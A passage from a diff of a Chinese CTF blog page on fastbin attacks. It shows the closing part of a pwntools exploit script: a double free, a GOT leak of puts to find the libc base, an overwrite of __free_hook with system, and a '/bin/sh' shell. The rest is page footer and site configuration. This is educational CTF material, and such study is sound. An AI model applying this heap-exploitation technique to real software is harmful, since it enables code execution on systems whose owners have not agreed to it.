+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index of message you want to display:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;The message: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;aaaa&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;bbbb&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=s1>&#39;cccc&#39;</span><span class=p>)</span> <span class=c1># idx: 0</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># delete(0)</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 0 &lt;- 1 &lt;- 0</span>
+</span></span><span class=line><span class=cl>    <span class=nb>list</span> <span class=o>=</span> <span class=mh>0x602060</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=nb>list</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>))</span> <span class=c1># 0</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span> <span class=c1># 1</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># 0</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>display</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;puts_addr: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;libc_base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x0000000003c67a8</span><span class=p>))</span> <span class=c1># __free_hook</span>
+</span></span><span class=line><span class=cl>    <span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x0453a0</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(p)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>Ctf
 </a><a href=/tags/pwn/>Pwn</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
 赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.jpg alt="lhon901 - 支付宝">
 <span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.jpg alt="lhon901 - 微信">
@@ -156,4 +946,4 @@ fastbin attack 指针对 ptmalloc2 中 fastbin 结构的攻击和漏洞利用手
 <span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
 <span itemprop=copyrightYear>2025
 </span><span class=with-love><i class="fa fa-heart"></i>
-</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/","title":"从零开始的 Pwn 之旅 - Fastbin Attack","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1756563988" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1756563988" defer></script></body></html>
+</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/","title":"从零开始的 Pwn 之旅 - Fastbin Attack","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1756904045" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1756904045" defer></script></body></html>
